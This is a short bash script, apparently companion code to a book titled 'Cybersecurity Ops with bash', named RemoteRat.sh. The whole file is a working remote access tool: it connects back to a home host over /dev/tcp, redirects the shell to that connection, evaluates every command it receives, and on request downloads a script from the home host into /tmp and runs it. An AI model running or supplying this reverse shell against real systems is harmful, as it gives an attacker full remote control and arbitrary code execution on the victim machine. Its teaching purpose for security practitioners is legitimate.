#!/bin/bash -
#
# Cybersecurity Ops with bash
# RemoteRat.sh
#
# Description:
# Remote access tool to be run on the remote system;
# mostly hands any input to the shell
# but if indicated (with a !) fetch and run a script
#
# Usage:  RemoteRat.sh  hostname port1 [port2 [port3]]
#


function cleanup ()
{
    rm -f $TMPFL
}

function runScript ()
{
    # tell 'em what script we want
    echo "$1" > /dev/tcp/${HOMEHOST}/${HOMEPORT2}
    # stall
    sleep 1
    if [[ $1 == 'exit' ]] ; then exit ; fi
    cat > $TMPFL </dev/tcp/${HOMEHOST}/${HOMEPORT3}
    bash $TMPFL
}

# -------------------  MAIN -------------------
# could do some error checking here
HOMEHOST=${1:-192.168.56.20}
HOMEPORT=${2:-8080}
HOMEPORT2=${3:-$((HOMEPORT+1))}
HOMEPORT3=${4:-$((HOMEPORT2+1))}

TMPFL="/tmp/$$.sh"
trap cleanup EXIT

# phone home:
exec  </dev/tcp/${HOMEHOST}/${HOMEPORT} 1>&0 2>&0

while true
do
    echo -n '$ '
    read -r
    if [[ ${REPLY:0:1} == '!' ]]
    then
	# it's a script
        FN=${REPLY:1}
	runScript $FN
    else
	# normal case - run the cmd
	eval "$REPLY"
    fi
done